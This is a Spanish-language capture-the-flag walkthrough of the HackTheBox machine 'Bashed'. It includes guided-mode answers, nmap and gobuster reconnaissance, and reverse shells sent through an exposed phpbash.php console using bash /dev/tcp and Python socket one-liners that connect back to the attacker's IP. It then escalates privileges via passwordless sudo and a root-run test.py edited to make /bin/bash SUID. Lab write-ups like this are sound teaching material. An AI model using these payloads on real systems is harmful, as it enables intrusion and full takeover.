#easy #linux #nmap #ping #revershell #tratamientotty #gobuster #sudo-l

-------
# Guided Mode

1)¿Cuántos puertos TCP abiertos están a la escucha en Bashed?
	1

2)¿Cuál es la ruta relativa en el servidor web a una carpeta que contiene phpbash.php?
	/dev

3)¿Con qué usuario se ejecuta el servidor web en Bashed?
	www-data

*La pregunta anterior era la flag de user.txt*
5)www-data puede ejecutar cualquier comando como usuario sin contraseña. ¿Cuál es el nombre de usuario de ese usuario?
	scriptmanager

6)¿A qué carpeta de la raíz del sistema puede acceder scriptmanager que www-data no puede?
	/scripts

7)¿Cuál es el nombre del archivo que se ejecuta cada dos minutos por root?
	test.py

------
# [[Reconocimiento de OS(Sistema operativo) y puertos abiertos con NMAP]]

```shell
ping -c 1 10.10.10.68
nmap -p- --open -vvv -sS --min-rate 5000 -n -Pn 10.10.10.68 -oG allPorts
nmap -sCV -p80 10.10.10.68 -oN target
```

![[Bashed1.png]]

![[Bashed2.png]]
*TLL:* Maquina Linux
*Puertos:*
	`80` HTTP

-------
# [[Whatweb-wappalyzer]]

```shell
whatweb http:10.10.10.68
```

![[Bashed3.png]]
No nos da ninguna informacion relevante

------

# [[Gobuster]]

![[Bashed4.png]]
*Informacion Relevante:*
	Directorio */dev*

Busque con [[Gobuster]] por archivos php,txt y back. Pero la verdad no encontre nada

---------
# [[Reverse shell]] con python

El directorio que nos llama la atencion es http://10.10.10.68/dev. Entramos y vemos el archivo phpbash.php, ingresamos

![[Bashed7.png]]
Y es uan consola interactiva, como podemos ver estamos conectados con la maquina, asi que ahora vamos a mandar una [[Reverse shell]]

![[Bashed6.png]]
Ahora nos ponemos en escucha con [[nc -nlvp 443]]
Intentamos cargar el payload de ``bash -c 'bash -i >& /dev/tcp/10.10.16.4/443 0>&1'``  en esta consola interactiva que encontramos, pero no nos da conexion
Asi que vamos a probar hacer la [[Reverse shell]] con el payload de python
```shell
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.10.16.10",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call(["/bin/bash"])'
```

![[Bashed8.png]]
Ya estamos dentro de la maquina

--------
# [[Tratamiento de la TTY]]

-----
# Escalada de privilegios a usuario scriptmanager con [[Abuso de Sudo]]

Con [[sudo]] usamos el comando `sudo -l`
```shell
sudo -l
```

Vemos que podemos correr el binario de scriptmanager sin usar contraseña
![[Bashed9.png]]

Ahora vamos a usar con [[sudo]] el comando ``sudo -u scriptmanager /bin/bash`` para ejecutar la bash como el usuario scriptmanager

![[Bashed10.png]]
Ahora estamos como scriptmanger

------
# Escalada de privilegios al usuario root

Con [[ls]] usamos el comando `ls -l` y vemos que como scriptmanager tenemos acceso a la carpeta scripts que esta en la raiz del sistema

![[Bashed11.png]]

Vemos que en esta carpeta hay un archivo *test.py* que abre el archivo test.txt, luego lo escribe y lo cierra, pero vemos despues que ejecutando [[ls]] con el comando `ls -l` que lo esta haciendo como root

![[Bashed12.png]]

Con [[nano]] vamos a abrir el *test.py* usando el comando `nano test.py` le vamos a poner el siguiente oneliner para hacer la bash [[SUID]]
```
import os; os.chmod("/bin/bash", 0o4755)
```

![[Bashed14.png]]
Despues vamos a ejecutar una [[bash]] con privilegios usando el comando `bash -p` y como es *SUID* ahora pasamos a ser el usuario *root*. Para posteriormente catear las flags
![[Bashed13.png]]